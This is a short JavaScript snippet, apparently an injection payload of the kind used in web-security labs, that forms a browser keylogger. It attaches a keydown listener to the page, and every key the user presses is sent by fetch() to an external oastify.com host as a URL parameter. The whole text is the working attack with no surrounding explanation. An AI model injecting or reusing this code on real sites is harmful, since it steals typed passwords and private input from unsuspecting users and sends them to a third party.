function logKey(event){
	fetch("https://xklf1f73x68qe8v97opva6fy1p7gv6jv.oastify.com/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
